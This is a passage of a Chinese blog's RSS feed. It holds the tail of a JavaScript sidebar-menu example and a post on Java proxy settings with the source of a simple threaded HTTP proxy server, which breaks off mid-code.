',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('寓言 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('教育 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('散文 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>t=outlookbar.addtitle('技术文档2')<BR>outlookbar.additem('Web开发',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('数据库',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>t=outlookbar.addtitle('计算机技术2')<BR>outlookbar.additem('操作系统',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('网络安全',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('小技巧',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('硬件相关',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>t=outlookbar.addtitle('文摘2')<BR>outlookbar.additem('求职 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('杂文 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('生活 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('人生 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('健康 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('知识 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('爱情 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('幽默笑话 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('寓言 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('教育 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('散文 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>//--&gt;<BR>&lt;/script&gt;<BR>&lt;table id=mnuList style="WIDTH:150px;HEIGHT: 100%" cellspacing=0 cellpadding=0 align=center border=0&gt;<BR>&nbsp;&lt;tr&gt; <BR>&nbsp; &lt;td bgcolor=#F0F0E5 id=outLookBarShow style="HEIGHT: 100%" valign=top align=center name="outLookBarShow"&gt;<BR>&nbsp;&nbsp; &lt;script language="JavaScript"&gt;<BR>&nbsp;&nbsp; &lt;!--<BR>&nbsp;&nbsp; locatefold("")<BR>&nbsp;&nbsp; outlookbar.show() <BR>&nbsp;&nbsp; //--&gt;<BR>&nbsp;&nbsp; &lt;/script&gt;<BR>&nbsp; &lt;/td&gt;<BR>&nbsp;&lt;/tr&gt;<BR>&lt;/table&gt;<BR>&lt;/body&gt;<BR>&lt;/html&gt;</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007111174655552/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java的网络代理机制]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200833013844282/</link>
      <description>
<![CDATA[Java使用代理时需要设置System.getProperteis()的属性<br>详见http://java.sun.com/j2se/1.4.2/docs/guide/net/properties.html<br><br>一个Server程序（模拟HTTP代理）和一个Client端程序（测试代理）。代理服务器可以在www.cnproxy.com找到。<br><br>Server:<br>import java.io.IOException;<br>import java.io.InputStream;<br>import java.io.InterruptedIOException;<br>import java.io.OutputStream;<br>import java.net.ServerSocket;<br>import java.net.Socket;<br><br>/*******************************************************************************<br>&nbsp;*<br>&nbsp;*/<br><br>public class JavaProxyTest extends Thread {<br>&nbsp;&nbsp; &nbsp;static public int CONNECT_RETRIES = 5;<br><br>&nbsp;&nbsp; &nbsp;static public int CONNECT_PAUSE = 5;<br><br>&nbsp;&nbsp; &nbsp;static public int TIMEOUT = 50;<br><br>&nbsp;&nbsp; &nbsp;static public int BUFSIZ = 1024;<br><br>&nbsp;&nbsp; &nbsp;static public boolean logging = false;<br><br>&nbsp;&nbsp; &nbsp;static public OutputStream log = null;<br><br>&nbsp;&nbsp; &nbsp;// in Socket<br>&nbsp;&nbsp; &nbsp;protected Socket socket;<br><br>&nbsp;&nbsp; &nbsp;// parent proxy<br>&nbsp;&nbsp; &nbsp;static private String parent = null;<br><br>&nbsp;&nbsp; &nbsp;static private int parentPort = -1;<br><br>&nbsp;&nbsp; &nbsp;static public void setParentProxy(String name, int pport) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;parent = name;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;parentPort = pport;<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;// craate a proxy socket<br>&nbsp;&nbsp; &nbsp;public JavaProxyTest(Socket s) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;socket = s;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;start();<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;public void writeLog(int c, boolean browser) throws IOException {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;log.write(c);<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;public void writeLog(byte[] bytes, int offset, int len, boolean browser)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;throws IOException {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for (int i = 0; i &lt; len; i++)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;writeLog((int) bytes[offset + i], browser);<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;// log to console<br>&nbsp;&nbsp; &nbsp;public String processHostName(String url, String host, int port, Socket sock) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;java.text.DateFormat cal = java.text.DateFormat.getDateTimeInstance();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println(cal.format(new java.util.Date()) + " - " + url + " "<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;+ sock.getInetAddress() + "\n");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return host;<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;// operating <br>&nbsp;&nbsp; &nbsp;public void run() {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String line;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String host;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;int port = 80;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Socket outbound = null;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;socket.setSoTimeout(TIMEOUT);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;InputStream is = socket.getInputStream();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;OutputStream os = null;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// run request line command<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;line = "";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = "";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;int state = 0;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;boolean space;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (true) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;int c = is.read();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (c == -1)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (logging)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;writeLog(c, true);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;space = Character.isWhitespace((char) c);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;switch (state) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;case 0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (space)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;state = 1;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;case 1:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (space) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;state = 2;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;line = line + (char) c;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;case 2:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (space)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue; // skip space<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;state = 3;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;case 3:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (space) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;state = 4;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// only take host<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String host0 = host;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;int n;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;n = host.indexOf("//");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (n != -1)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = host.substring(n + 2);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;n = host.indexOf('/');<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (n != -1)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = host.substring(0, n);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// anyalyze port<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;n = host.indexOf(":");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (n != -1) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;port = Integer.parseInt(host.substring(n + 1));<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = host.substring(0, n);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = processHostName(host0, host, port, socket);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (parent != null) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = parent;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;port = parentPort;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;int retry = CONNECT_RETRIES;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (retry-- != 0) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;outbound = new Socket(host, port);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// wait<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Thread.sleep(CONNECT_PAUSE);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (outbound == null)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;outbound.setSoTimeout(TIMEOUT);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os = outbound.getOutputStream();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os.write(line.getBytes());<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os.write(' ');<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os.write(host0.getBytes());<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os.write(' ');<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pipe(is, outbound.getInputStream(), os, socket<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;.getOutputStream());<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;host = host + (char) c;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (IOException e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} finally {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;socket.close();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception e1) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;outbound.close();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception e2) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;void pipe(InputStream is0, InputStream is1, OutputStream os0,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;OutputStream os1) throws IOException {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;int ir;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;byte bytes[] = new byte[BUFSIZ];<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (true) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if ((ir = 